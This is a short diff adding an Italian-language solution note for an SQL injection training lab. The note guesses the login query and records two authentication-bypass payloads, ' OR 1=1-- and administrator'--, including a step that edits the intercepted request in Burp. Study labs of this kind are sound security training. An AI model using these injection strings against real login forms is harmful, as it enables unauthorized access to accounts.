@@ -1,0 +1,25 @@
+This lab contains an SQL injection vulnerability in the login function.
+
+To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.
+
+
+PROBABILE QUERY
+
+SELECT username FROM users WHERE username='' AND password = '';
+
+
+
+EXPLOIT MANUALE
+
+1) SELECT username,password FROM users WHERE username='' AND password = '';
+CAMPO PASSWORD: ' OR 1=1--
+
+= SELECT username,password FROM users WHERE username='administrator' AND password = '' OR 1=1--';
+FUNZIONA
+
+2) SELECT username,password FROM users WHERE username='' AND password = '';
+CAMPO USERNAME: administrator'--
+
+= SELECT username,password FROM users WHERE username='administrator'--' AND password = '';
+NON FUNZIONA. CAMPO PASSWORD NECESSARIO. MODIFICANDO LA RICHIESTA INTERCETTATA IN BURP NEL NOME UTENTE (administrator'--)
+FUNZIONA
